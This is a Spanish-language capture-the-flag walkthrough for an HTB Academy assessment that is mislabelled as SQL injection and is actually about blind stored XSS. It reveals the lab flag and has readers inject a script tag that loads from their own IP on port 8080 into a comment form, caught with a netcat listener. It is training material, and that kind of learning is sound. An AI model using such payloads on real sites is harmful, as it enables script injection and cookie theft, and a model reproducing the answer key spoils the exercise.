# Skills Assessment - SQL Injection Fundamentals

* **Target:** `10.129.106.246`
* **Módulo:** HTB Academy
---
## What is the value of the 'flag' cookie?

* **Answer**: `HTB{cr055_5173_5cr1p71n6_n1nj4}`
#### Procedimiento:
1. Vamos a la pagina: `10.129.106.246/assessment`

![](imgs/XSS/.png)
![Assessment](imgs/XSS/one.png)

2. Encontramos un cuadro de busqueda (search input):

![SearchInput](imgs/XSS/two.png)

pero normalmente en ejercicios de XSS la cosa no va por ahi.
Ahora, fijate en esto, parece que nos llevara a la sección de comentarios asi que demosle click:

![CommentSection](imgs/XSS/three.png)

Y ahora tenemos esto:

![CommentSection](imgs/XSS/comment_section.png)

### A partir de aqui quiero que hagas lo siguiente pero despues te lo voy a explicar asi que no te preocupes, solo sigueme por ahora:

Primero pon esto en tu terminal linux: `ip a s tun0`
![CommentTest](imgs/XSS/five.png)

Con eso obtenemos nuestra ip que es `10.10.14.252` (en mi caso, a ti te saldra otra obviamente).

Segundo pon esto en la parte que dice "Website": (pon cualquier cosa en "name", "email" y "comment")

```
<script src="http://[LA_IP_QUE_TE_SALIO]:8080"></script>
```

![CommentTest](imgs/XSS/four.png)

(en la seccion "email" pon cualquier cosa pero obviamente debes poner el `@gmail.com` :v)

NO LE DES A "POST COMMENT" AUN.
Falta esto: Ve a la terminal de linux de nuevo y pon `sudo nc -lvnp 8080`:

Ahora sí, entra a la págin y dale en "Post comment".

En tu terminal de linux verás un mensaje algo así:

![nc](imgs/XSS/six.png)

Eso significa que recibimos el mensaje y, por lo tanto, hemos demostrado que el input es vulnerable.

### Ahora te explico porque hemos hecho eso?


